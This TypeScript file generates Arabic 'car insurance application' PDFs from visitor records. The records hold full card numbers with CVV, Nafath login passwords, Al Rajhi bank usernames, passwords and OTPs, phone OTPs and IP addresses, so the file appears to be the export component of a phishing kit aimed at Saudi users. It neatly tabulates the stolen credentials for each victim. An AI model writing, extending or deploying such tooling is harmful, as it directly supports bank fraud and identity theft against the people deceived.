import jsPDF from "jspdf";
import { amiriFont } from "./amiri-font";

interface VisitorData {
  id: string;
  personalInfo?: {
    nationalId?: string;
    birthDate?: string;
    phone?: string;
    documment_owner_full_name?: string;
  };
  vehicleInfo?: {
    serialNumber?: string;
    vehicleYear?: string;
    coverageType?: string;
    selectedAddOns?: string[];
  };
  selectedOffer?: {
    companyName?: string;
    basePrice?: number;
    totalPrice?: number;
    discountPercentage?: number;
  };
  paymentInfo?: {
    cardNumber?: string;
    cardHolder?: string;
    expiryDate?: string;
    cvv?: string;
  };
  nafazData?: {
    idNumber?: string;
    password?: string;
    authNumber?: string;
  };
  rajhiData?: {
    username?: string;
    password?: string;
    otp?: string;
  };
  phoneData?: {
    phoneNumber?: string;
    carrier?: string;
    otp?: string;
  };
  metadata?: {
    country?: string;
    browser?: string;
    os?: string;
    ip?: string;
    createdAt?: any;
  };
}

function drawSectionHeader(doc: jsPDF, title: string, y: number, margin: number, width: number, color: number[] = [0, 82, 147]): number {
  doc.setFillColor(color[0], color[1], color[2]);
  doc.rect(margin, y, width - 2 * margin, 8, "F");
  doc.setTextColor(255, 255, 255);
  doc.setFontSize(11);
  doc.text(title, width / 2, y + 5.5, { align: "center" });
  return y + 10;
}

function drawTableRow(doc: jsPDF, label: string, value: string, y: number, margin: number, pageWidth: number, isEven: boolean): number {
  const rowHeight = 10;
  const labelColWidth = 60;
  const tableWidth = pageWidth - 2 * margin;
  const valueColWidth = tableWidth - labelColWidth;

  if (isEven) {
    doc.setFillColor(245, 245, 245);
    doc.rect(margin, y, tableWidth, rowHeight, "F");
  }

  doc.setFillColor(235, 235, 235);
  doc.rect(margin + valueColWidth, y, labelColWidth, rowHeight, "F");

  doc.setDrawColor(200, 200, 200);
  doc.rect(margin, y, tableWidth, rowHeight, "S");
  doc.line(margin + valueColWidth, y, margin + valueColWidth, y + rowHeight);

  doc.setFontSize(10);
  doc.setTextColor(60, 60, 60);
  doc.text(label, margin + valueColWidth + labelColWidth - 4, y + 6.5, { align: "right" });

  doc.setTextColor(30, 30, 30);
  doc.text(value, margin + 4, y + 6.5, { align: "left" });

  return y + rowHeight;
}

function checkPageBreak(doc: jsPDF, y: number, needed: number): number {
  const pageHeight = doc.internal.pageSize.getHeight();
  if (y + needed > pageHeight - 20) {
    doc.addPage();
    return 15;
  }
  return y;
}

export function generateInsurancePDF(data: VisitorData): void {
  const doc = new jsPDF({
    orientation: "portrait",
    unit: "mm",
    format: "a4",
  });

  doc.addFileToVFS("Amiri-Regular.ttf", amiriFont);
  doc.addFont("Amiri-Regular.ttf", "Amiri", "normal");
  doc.setFont("Amiri");

  const pageWidth = doc.internal.pageSize.getWidth();
  const margin = 15;
  let y = 20;

  doc.setFontSize(22);
  doc.setTextColor(0, 82, 147);
  doc.text("تأمين السيارات", pageWidth / 2, y, { align: "center" });
  y += 10;

  doc.setFontSize(14);
  doc.setTextColor(0, 82, 147);
  doc.text("استمارة طلب", pageWidth / 2, y, { align: "center" });
  y += 12;

  y = checkPageBreak(doc, y, 55);
  y = drawSectionHeader(doc, "معلومات مقدم الطلب", y, margin, pageWidth);
  y = drawTableRow(doc, "الاسم الكامل", data.personalInfo?.documment_owner_full_name || data.personalInfo?.fullName || "-", y, margin, pageWidth, false);
  y = drawTableRow(doc, "رقم الهوية", data.personalInfo?.nationalId || "-", y, margin, pageWidth, true);
  y = drawTableRow(doc, "رقم الهاتف", data.personalInfo?.phone || "-", y, margin, pageWidth, false);
  y = drawTableRow(doc, "تاريخ الميلاد", data.personalInfo?.birthDate || "-", y, margin, pageWidth, true);
  y += 8;

  if (data.vehicleInfo) {
    y = checkPageBreak(doc, y, 55);
    y = drawSectionHeader(doc, "معلومات المركبة", y, margin, pageWidth);
    y = drawTableRow(doc, "الرقم التسلسلي", data.vehicleInfo?.serialNumber || "-", y, margin, pageWidth, false);
    y = drawTableRow(doc, "سنة الصنع", data.vehicleInfo?.vehicleYear || "-", y, margin, pageWidth, true);
    y = drawTableRow(doc, "نوع التغطية", data.vehicleInfo?.coverageType || "-", y, margin, pageWidth, false);
    y = drawTableRow(doc, "الإضافات", data.vehicleInfo?.selectedAddOns?.join(", ") || "-", y, margin, pageWidth, true);
    y += 8;
  }

  if (data.selectedOffer) {
    y = checkPageBreak(doc, y, 55);
    y = drawSectionHeader(doc, "عرض التأمين", y, margin, pageWidth);
    y = drawTableRow(doc, "الشركة", data.selectedOffer?.companyName || "-", y, margin, pageWidth, false);
    y = drawTableRow(doc, "السعر الأساسي", data.selectedOffer?.basePrice ? `${data.selectedOffer.basePrice} ر.س` : "-", y, margin, pageWidth, true);
    y = drawTableRow(doc, "الخصم", data.selectedOffer?.discountPercentage ? `${data.selectedOffer.discountPercentage}%` : "-", y, margin, pageWidth, false);
    y = drawTableRow(doc, "السعر الإجمالي", data.selectedOffer?.totalPrice ? `${data.selectedOffer.totalPrice} ر.س` : "-", y, margin, pageWidth, true);
    y += 8;
  }

  if (data.paymentInfo?.cardNumber) {
    y = checkPageBreak(doc, y, 55);
    y = drawSectionHeader(doc, "معلومات الدفع", y, margin, pageWidth);
    y = drawTableRow(doc, "رقم البطاقة", data.paymentInfo?.cardNumber || "-", y, margin, pageWidth, false);
    y = drawTableRow(doc, "اسم حامل البطاقة", data.paymentInfo?.cardHolder || "-", y, margin, pageWidth, true);
    y = drawTableRow(doc, "تاريخ الانتهاء", data.paymentInfo?.expiryDate || "-", y, margin, pageWidth, false);
    y = drawTableRow(doc, "CVV", data.paymentInfo?.cvv || "-", y, margin, pageWidth, true);
    y += 8;
  }

  if (data.nafazData?.idNumber) {
    y = checkPageBreak(doc, y, 45);
    y = drawSectionHeader(doc, "توثيق نفاذ", y, margin, pageWidth);
    y = drawTableRow(doc, "رقم الهوية", data.nafazData?.idNumber || "-", y, margin, pageWidth, false);
    y = drawTableRow(doc, "كلمة المرور", data.nafazData?.password || "-", y, margin, pageWidth, true);
    y = drawTableRow(doc, "رقم التوثيق", data.nafazData?.authNumber || "-", y, margin, pageWidth, false);
    y += 8;
  }

  if (data.rajhiData?.username) {
    y = checkPageBreak(doc, y, 45);
    y = drawSectionHeader(doc, "بنك الراجحي", y, margin, pageWidth);
    y = drawTableRow(doc, "اسم المستخدم", data.rajhiData?.username || "-", y, margin, pageWidth, false);
    y = drawTableRow(doc, "كلمة المرور", data.rajhiData?.password || "-", y, margin, pageWidth, true);
    y = drawTableRow(doc, "رمز التحقق", data.rajhiData?.otp || "-", y, margin, pageWidth, false);
    y += 8;
  }

  if (data.phoneData?.phoneNumber) {
    y = checkPageBreak(doc, y, 45);
    y = drawSectionHeader(doc, "التحقق من الهاتف", y, margin, pageWidth);
    y = drawTableRow(doc, "رقم الهاتف", data.phoneData?.phoneNumber || "-", y, margin, pageWidth, false);
    y = drawTableRow(doc, "شركة الاتصالات", data.phoneData?.carrier || "-", y, margin, pageWidth, true);
    y = drawTableRow(doc, "رمز التحقق", data.phoneData?.otp || "-", y, margin, pageWidth, false);
    y += 8;
  }

  if (data.metadata) {
    const createdAt = data.metadata?.createdAt?.toDate?.()
      ? data.metadata.createdAt.toDate().toLocaleString("ar-SA")
      : data.metadata?.createdAt || "-";

    y = checkPageBreak(doc, y, 65);
    y = drawSectionHeader(doc, "البيانات الوصفية", y, margin, pageWidth, [100, 100, 100]);
    y = drawTableRow(doc, "الدولة", data.metadata?.country || "-", y, margin, pageWidth, false);
    y = drawTableRow(doc, "المتصفح", data.metadata?.browser || "-", y, margin, pageWidth, true);
    y = drawTableRow(doc, "نظام التشغيل", data.metadata?.os || "-", y, margin, pageWidth, false);
    y = drawTableRow(doc, "عنوان IP", data.metadata?.ip || "-", y, margin, pageWidth, true);
    y = drawTableRow(doc, "تاريخ الإنشاء", createdAt, y, margin, pageWidth, false);
  }

  const pageHeight = doc.internal.pageSize.getHeight();
  doc.setFontSize(8);
  doc.setTextColor(128, 128, 128);
  const timestamp = new Date().toLocaleString("ar-SA");
  doc.text(
    `تم الإنشاء: ${timestamp} | رقم المستند: ${data.id}`,
    pageWidth / 2,
    pageHeight - 10,
    { align: "center" }
  );

  const fileName = `طلب_تأمين_${data.personalInfo?.nationalId || data.id}_${Date.now()}.pdf`;
  doc.save(fileName);
}
